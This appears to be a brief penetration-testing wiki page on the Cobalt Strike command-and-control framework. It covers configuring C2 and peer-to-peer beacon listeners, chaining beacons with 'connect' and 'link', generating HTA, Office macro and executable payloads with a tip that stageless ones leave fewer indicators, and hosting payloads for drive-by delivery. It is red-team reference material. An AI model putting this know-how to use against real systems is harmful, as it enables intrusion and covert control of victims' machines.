# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`&#x20;

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** for an office document with a macro
* **`Windows Executable`** for a .exe, .dll orr service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

#### Host Payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.
